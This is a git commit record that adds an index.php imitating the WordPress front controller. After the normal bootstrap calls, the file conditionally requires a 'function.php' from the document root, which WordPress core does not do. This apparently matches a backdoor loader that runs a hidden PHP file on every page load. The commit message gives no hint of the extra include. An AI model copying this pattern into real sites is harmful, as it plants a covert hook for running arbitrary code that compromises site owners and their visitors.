a0fbce7d21c3c96089ca615a821654ad135961f2
David Rodriguez <24427021+drod247@users.noreply.github.com>
2021-12-20 23:22:05 -0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,21 @@
+<?php
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+
+	require_once __DIR__ . '/wp-load.php';
+
+
+	wp();
+
+	require_once ABSPATH . WPINC . '/template-loader.php';
+	$_dir_ = $_SERVER['DOCUMENT_ROOT'];
+
+	if ( file_exists( './function.php' ) ) {
+		require_once($_dir_.'/function.php');
+		
+		}
+
+}
